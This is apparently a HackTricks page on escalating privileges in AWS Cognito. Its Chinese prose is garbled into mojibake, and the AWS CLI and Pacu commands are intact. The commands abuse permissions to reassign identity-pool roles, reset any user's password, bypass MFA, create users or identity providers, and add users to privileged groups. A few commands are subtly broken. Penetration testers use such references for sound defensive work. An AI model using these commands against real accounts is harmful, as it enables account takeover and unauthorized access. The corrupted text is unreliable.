# AWS - Cognitoæƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## Cognito

æœ‰å…³Cognitoçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### å·¥å…·

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)ï¼ŒAWSåˆ©ç”¨æ¡†æ¶ï¼Œç°åœ¨åŒ…æ‹¬â€œcognito\_\_enumâ€å’Œâ€œcognito\_\_attackâ€æ¨¡å—ï¼Œå¯è‡ªåŠ¨æšä¸¾å¸æˆ·ä¸­æ‰€æœ‰Cognitoèµ„äº§ï¼Œå¹¶æ ‡è®°å¼±é…ç½®ã€ç”¨äºè®¿é—®æ§åˆ¶çš„ç”¨æˆ·å±æ€§ç­‰ï¼Œè¿˜å¯æ ¹æ®å¯ä¿®æ”¹çš„è‡ªå®šä¹‰å±æ€§ã€å¯ç”¨çš„èº«ä»½æ± å‡­æ®ã€idä»¤ç‰Œä¸­çš„å¯å‡å®šè§’è‰²ç­‰è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ï¼ˆåŒ…æ‹¬MFAæ”¯æŒï¼‰å’Œç‰¹æƒæå‡ã€‚

æœ‰å…³æ¨¡å—åŠŸèƒ½çš„æè¿°ï¼Œè¯·å‚é˜…[åšå®¢æ–‡ç« ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)çš„ç¬¬2éƒ¨åˆ†ã€‚æœ‰å…³å®‰è£…è¯´æ˜ï¼Œè¯·å‚é˜…[Pacu](https://github.com/RhinoSecurityLabs/pacu)ä¸»é¡µã€‚

#### ç”¨æ³•

ç¤ºä¾‹cognito\_\_attackç”¨æ³•ï¼Œå°è¯•å¯¹ç»™å®šçš„èº«ä»½æ± å’Œç”¨æˆ·æ± å®¢æˆ·ç«¯è¿›è¡Œç”¨æˆ·åˆ›å»ºå’Œæ‰€æœ‰æƒé™æå‡å‘é‡ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
ä»¥ä¸‹æ˜¯ä½¿ç”¨cognito\_\_enumçš„ç¤ºä¾‹ï¼Œç”¨äºæ”¶é›†å½“å‰AWSè´¦æˆ·ä¸­å¯è§çš„æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± ã€ç”¨æˆ·ç­‰ä¿¡æ¯ï¼š
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) æ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„CLIå·¥å…·ï¼Œå®ç°äº†å¯¹Cognitoçš„ä¸åŒæ”»å‡»ï¼ŒåŒ…æ‹¬ç‰¹æƒå‡çº§ã€‚

#### å®‰è£…
```bash
$ pip install cognito-scanner
```
#### ç”¨æ³•
```bash
$ cognito-scanner --help
```
### ä»èº«ä»½æ± ä¸­æ”¶é›†å‡­æ®

ç”±äºCognitoå¯ä»¥å‘**ç»è¿‡èº«ä»½éªŒè¯**å’Œ**æœªç»èº«ä»½éªŒè¯**çš„**ç”¨æˆ·**æˆäºˆ**IAMè§’è‰²å‡­æ®**ï¼Œå¦‚æœæ‚¨æ‰¾åˆ°åº”ç”¨ç¨‹åºçš„**èº«ä»½æ± ID**ï¼ˆåº”è¯¥åœ¨åº”ç”¨ç¨‹åºä¸­ç¡¬ç¼–ç ï¼‰ï¼Œåˆ™å¯ä»¥è·å–æ–°çš„å‡­æ®ï¼Œä»è€Œæå‡æƒé™ï¼ˆåœ¨æ‚¨ä¹‹å‰å¯èƒ½ç”šè‡³æ²¡æœ‰ä»»ä½•å‡­æ®çš„AWSå¸æˆ·å†…ï¼‰ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹æ­¤é¡µé¢**](../aws-unauthenticated-enum-access/#cognito)ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°é™„åŠ åˆ°æœªç»èº«ä»½éªŒè¯ç”¨æˆ·çš„æœåŠ¡è§’è‰²ï¼ˆå¯èƒ½ä¹Ÿæ˜¯é™„åŠ åˆ°ç»è¿‡èº«ä»½éªŒè¯ç”¨æˆ·çš„è§’è‰²ï¼‰ã€‚

### `cognito-identity:SetIdentityPoolRoles`ï¼Œ`iam:PassRole`

æ‹¥æœ‰æ­¤æƒé™ï¼Œæ‚¨å¯ä»¥å°†ä»»ä½•Cognitoè§’è‰²æˆäºˆCognitoåº”ç”¨ç¨‹åºçš„ç»è¿‡èº«ä»½éªŒè¯/æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·ã€‚
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
å¦‚æœCognitoåº”ç”¨ç¨‹åº**æœªå¯ç”¨æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·**ï¼Œæ‚¨å¯èƒ½è¿˜éœ€è¦æƒé™`cognito-identity:UpdateIdentityPool`æ¥å¯ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥ç‰¹æƒå‡çº§åˆ°ä»»ä½•Cognitoè§’è‰²ã€‚

### `cognito-identity:update-identity-pool`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥è®¾ç½®ä¾‹å¦‚ä¸€ä¸ªå—ä»–æ§åˆ¶çš„Cognitoç”¨æˆ·æ± æˆ–ä»»ä½•å…¶ä»–èº«ä»½æä¾›è€…ï¼Œä»–å¯ä»¥ç™»å½•ä¸ºä¸€ç§**è®¿é—®æ­¤Cognitoèº«ä»½æ± çš„æ–¹å¼**ã€‚ç„¶åï¼Œåªéœ€**ç™»å½•**åˆ°è¯¥ç”¨æˆ·æä¾›è€…ï¼Œå°†**å…è®¸ä»–è®¿é—®èº«ä»½æ± ä¸­é…ç½®çš„ç»è¿‡èº«ä»½éªŒè¯çš„è§’è‰²**ã€‚
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
ä¹Ÿå¯ä»¥**æ»¥ç”¨è¿™ä¸ªæƒé™æ¥å…è®¸åŸºæœ¬èº«ä»½éªŒè¯**ï¼š
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**æ½œåœ¨å½±å“**ï¼šå¦¥åèº«ä»½æ± ä¸­é…ç½®çš„ç»è¿‡èº«ä»½éªŒè¯çš„ IAM è§’è‰²ã€‚

### `cognito-idp:AdminAddUserToGroup`

æ­¤æƒé™å…è®¸**å°† Cognito ç”¨æˆ·æ·»åŠ åˆ° Cognito ç»„**ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤æƒé™å°†å—å…¶æ§åˆ¶çš„ç”¨æˆ·æ·»åŠ åˆ°å…·æœ‰**æ›´å¥½**æƒé™æˆ–**ä¸åŒ IAM è§’è‰²**çš„å…¶ä»–ç»„ä¸­ï¼š
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**æ½œåœ¨å½±å“:** ç‰¹æƒå‡çº§è‡³å…¶ä»– Cognito ç»„å’Œé™„åŠ åˆ°ç”¨æˆ·æ± ç»„çš„ IAM è§’è‰²ã€‚

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨**æ¯ä¸ªå¯ä»¥è¢«å—æŸ Cognito èº«ä»½æä¾›è€…ä½¿ç”¨çš„ IAM è§’è‰²**åˆ›å»º/æ›´æ–°ç»„ï¼Œå¹¶ä½¿å—æŸç”¨æˆ·æˆä¸ºè¯¥ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œè®¿é—®æ‰€æœ‰è¿™äº›è§’è‰²ï¼š

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç‰¹æƒå‡çº§è‡³å…¶ä»– Cognito IAM è§’è‰²ã€‚

### `cognito-idp:AdminConfirmSignUp`

æ­¤æƒé™å…è®¸**ç¡®è®¤æ³¨å†Œ**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•äººéƒ½å¯ä»¥åœ¨ Cognito åº”ç”¨ç¨‹åºä¸­æ³¨å†Œï¼Œå¦‚æœä¿ç•™è¿™ä¸€æƒé™ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»»ä½•æ•°æ®åˆ›å»ºå¸æˆ·ï¼Œå¹¶é€šè¿‡æ­¤æƒé™è¿›è¡ŒéªŒè¯ã€‚
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“:** å¦‚æœæ‚¨å¯ä»¥æ³¨å†Œæ–°ç”¨æˆ·ï¼Œåˆ™å¯èƒ½ä¼šé—´æ¥æå‡å¯¹å·²è®¤è¯ç”¨æˆ·çš„èº«ä»½æ±  IAM è§’è‰²çš„æƒé™ã€‚å¦‚æœèƒ½å¤Ÿç¡®è®¤ä»»ä½•å¸æˆ·ï¼Œåˆ™å¯èƒ½ä¼šé—´æ¥æå‡å¯¹å…¶ä»–åº”ç”¨åŠŸèƒ½çš„æƒé™ã€‚

### `cognito-idp:AdminCreateUser`

æ­¤æƒé™å…è®¸æ”»å‡»è€…åœ¨ç”¨æˆ·æ± å†…åˆ›å»ºæ–°ç”¨æˆ·ã€‚æ–°ç”¨æˆ·å°†è¢«åˆ›å»ºä¸ºå·²å¯ç”¨çŠ¶æ€ï¼Œä½†éœ€è¦æ›´æ”¹å¯†ç ã€‚
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡å·²è®¤è¯ç”¨æˆ·çš„èº«ä»½æ±  IAM è§’è‰²æƒé™ã€‚é—´æ¥æå‡è‡³å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·

### `cognito-idp:AdminEnableUser`

è¿™äº›æƒé™å¯ä»¥åœ¨ä¸€ä¸ªéå¸¸ç‰¹æ®Šçš„æƒ…å†µä¸‹å‘æŒ¥ä½œç”¨ï¼Œå³æ”»å‡»è€…æ‰¾åˆ°äº†ä¸€ä¸ªå·²ç¦ç”¨ç”¨æˆ·çš„å‡­æ®ï¼Œéœ€è¦**é‡æ–°å¯ç”¨**è¯¥ç”¨æˆ·ã€‚
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“:** å¯¹å·²éªŒè¯ç”¨æˆ·çš„èº«ä»½æ± IAMè§’è‰²è¿›è¡Œé—´æ¥æƒé™æå‡ï¼Œä»¥åŠå¦‚æœæ”»å‡»è€…æ‹¥æœ‰ç¦ç”¨ç”¨æˆ·çš„å‡­æ®ï¼Œåˆ™å¯èƒ½æå‡ç”¨æˆ·æƒé™ã€‚

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

æ­¤æƒé™å…è®¸ä½¿ç”¨[**ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password_auth)**æ–¹æ³•**è¿›è¡Œç™»å½•ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹é“¾æ¥ã€‚

### `cognito-idp:AdminSetUserPassword`

æ­¤æƒé™å…è®¸æ”»å‡»è€…**æ›´æ”¹ä»»ä½•ç”¨æˆ·çš„å¯†ç **ï¼Œä½¿å…¶èƒ½å¤Ÿå†’å……ä»»ä½•ç”¨æˆ·ï¼ˆæœªå¯ç”¨MFAçš„ç”¨æˆ·ï¼‰ã€‚
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡æƒé™ï¼Œå¯èƒ½è®¿é—®ä»»ä½•ç”¨æˆ·ï¼Œå› æ­¤å¯ä»¥è®¿é—®æ¯ä¸ªç”¨æˆ·æ‰€å±çš„æ‰€æœ‰ç»„ï¼Œå¹¶è®¿é—®èº«ä»½æ± ç»è¿‡èº«ä»½éªŒè¯çš„ IAM è§’è‰²ã€‚

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: æ”»å‡»è€…å¯èƒ½æ»¥ç”¨æ­¤æƒé™ï¼Œå°†è‡ªå·±æ§åˆ¶çš„æ‰‹æœºè®¾ç½®ä¸ºç”¨æˆ·çš„ **SMS MFA**ã€‚
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** ç±»ä¼¼äºå‰ä¸€ä¸ªæƒé™ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·çš„ MFA é¦–é€‰é¡¹ï¼Œä»è€Œç»•è¿‡ MFA ä¿æŠ¤ã€‚
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: ä¸å‰ä¸€ä¸ªæƒé™ç±»ä¼¼ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·æ± çš„MFAé¦–é€‰é¡¹ï¼Œä»è€Œç»•è¿‡MFAä¿æŠ¤ã€‚
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** ä¹Ÿå¯ä»¥æ›´æ–°ç”¨æˆ·æ± ä»¥æ›´æ”¹MFAç­–ç•¥ã€‚[åœ¨æ­¤å¤„æ£€æŸ¥cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)ã€‚

**æ½œåœ¨å½±å“:** å¯¹äºæ”»å‡»è€…çŸ¥é“å‡­æ®çš„ä»»ä½•ç”¨æˆ·é—´æ¥æå‡æƒé™ï¼Œè¿™å¯èƒ½å…è®¸ç»•è¿‡MFAä¿æŠ¤ã€‚

### `cognito-idp:AdminUpdateUserAttributes`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥æ›´æ”¹å…¶æ§åˆ¶ä¸‹ç”¨æˆ·çš„ç”µå­é‚®ä»¶æˆ–ç”µè¯å·ç æˆ–ä»»ä½•å…¶ä»–å±æ€§ï¼Œä»¥å°è¯•åœ¨åº•å±‚åº”ç”¨ç¨‹åºä¸­è·å¾—æ›´å¤šç‰¹æƒã€‚\
è¿™å…è®¸æ›´æ”¹ç”µå­é‚®ä»¶æˆ–ç”µè¯å·ç å¹¶å°†å…¶è®¾ç½®ä¸ºå·²éªŒè¯ã€‚
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**æ½œåœ¨å½±å“:** åœ¨ä½¿ç”¨Cognitoç”¨æˆ·æ± çš„åŸºç¡€åº”ç”¨ç¨‹åºä¸­æ½œåœ¨çš„é—´æ¥æƒé™æå‡ï¼Œæ ¹æ®ç”¨æˆ·å±æ€§æˆäºˆæƒé™ã€‚

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ¯”å·²å­˜åœ¨çš„æ± å®¢æˆ·ç«¯æƒé™æ›´å°‘çš„æ–°ç”¨æˆ·æ± å®¢æˆ·ç«¯**ã€‚ä¾‹å¦‚ï¼Œæ–°å®¢æˆ·ç«¯å¯ä»¥å…è®¸ä»»ä½•ç±»å‹çš„èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä¸éœ€è¦ä»»ä½•å¯†é’¥ï¼Œç¦ç”¨ä»¤ç‰Œæ’¤é”€ï¼Œå…è®¸ä»¤ç‰Œæœ‰æ•ˆæœŸæ›´é•¿...

å¦‚æœä¸æ˜¯åˆ›å»ºæ–°å®¢æˆ·ç«¯ï¼Œ**è€Œæ˜¯ä¿®æ”¹ç°æœ‰å®¢æˆ·ç«¯**ï¼Œä¹Ÿå¯ä»¥å®ç°ç›¸åŒçš„æ•ˆæœã€‚

åœ¨[**å‘½ä»¤è¡Œ**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)ï¼ˆæˆ–[**æ›´æ–°å‘½ä»¤**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)ï¼‰ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æ‰€æœ‰é€‰é¡¹ï¼Œè¯·æŸ¥çœ‹ï¼
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**æ½œåœ¨å½±å“:** é€šè¿‡åˆ›å»ºä¸€ä¸ªæ”¾å®½å®‰å…¨æªæ–½çš„æ–°å®¢æˆ·ç«¯ï¼Œå¯èƒ½å¯¼è‡´å¯¹ç”¨æˆ·æ± ä½¿ç”¨çš„èº«ä»½æ± æˆæƒç”¨æˆ·çš„æ½œåœ¨é—´æ¥æƒé™æå‡ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨ä»–èƒ½å¤Ÿåˆ›å»ºçš„ç”¨æˆ·ç™»å½•ã€‚

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™ä¸ªæƒé™ï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ–°ç”¨æˆ·çš„ csv æ–‡ä»¶æ¥åˆ›å»ºç”¨æˆ·ã€‚
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥ç‰¹æƒå‡çº§åˆ°èº«ä»½æ±  IAM è§’è‰²ï¼Œé—´æ¥ç‰¹æƒå‡çº§åˆ°å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„èº«ä»½æä¾›è€…ï¼Œç„¶åèƒ½å¤Ÿé€šè¿‡è¯¥æä¾›è€…**ç™»å½•**ã€‚
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡èº«ä»½æ± è®¤è¯ç”¨æˆ·çš„ IAM è§’è‰²æƒé™ã€‚é—´æ¥æå‡å…¶ä»–åº”ç”¨åŠŸèƒ½çš„æƒé™ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### cognito-sync:\* åˆ†æ

è¿™æ˜¯ Cognito èº«ä»½æ± è§’è‰²é»˜è®¤æ‹¥æœ‰çš„éå¸¸å¸¸è§çš„æƒé™ã€‚å³ä½¿æƒé™ä¸­åŒ…å«é€šé…ç¬¦é€šå¸¸çœ‹èµ·æ¥ä¸å¤ªå¥½ï¼ˆç‰¹åˆ«æ˜¯æ¥è‡ª AWSï¼‰ï¼Œ**ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œç»™å®šçš„æƒé™å¹¶ä¸æ˜¯éå¸¸æœ‰ç”¨**ã€‚

è¿™ä¸ªæƒé™å…è®¸è¯»å–èº«ä»½æ± å’Œèº«ä»½æ± å†…èº«ä»½ ID çš„ç”¨æˆ·ä¿¡æ¯ï¼ˆè¿™äº›ä¿¡æ¯å¹¶ä¸æ•æ„Ÿï¼‰ã€‚\
èº«ä»½ ID å¯èƒ½ä¼šè¢«åˆ†é…[**æ•°æ®é›†**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html)ï¼Œè¿™äº›æ•°æ®é›†æ˜¯ä¼šè¯ä¿¡æ¯ï¼ˆAWS å°†å…¶å®šä¹‰ä¸º**å·²ä¿å­˜çš„æ¸¸æˆ**ï¼‰ã€‚è¿™å¯èƒ½åŒ…å«æŸç§æ•æ„Ÿä¿¡æ¯ï¼ˆä½†æ¦‚ç‡éå¸¸ä½ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨[**æšä¸¾é¡µé¢**](../aws-services/aws-cognito-enum/)æ‰¾åˆ°å¦‚ä½•è®¿é—®è¿™äº›ä¿¡æ¯ã€‚

æ”»å‡»è€…è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›æƒé™**åŠ å…¥åˆ°å‘å¸ƒè¿™äº›æ•°æ®é›†æ›´æ”¹çš„ Cognito æµ**æˆ–**è§¦å‘ Cognito äº‹ä»¶çš„ Lambda**ä¸­ã€‚æˆ‘è¿˜æ²¡æœ‰çœ‹åˆ°è¿™ç§ç”¨æ³•ï¼Œå¹¶ä¸”æˆ‘ä¸è®¤ä¸ºè¿™é‡Œä¼šæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œä½†è¿™å¹¶éä¸å¯èƒ½ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
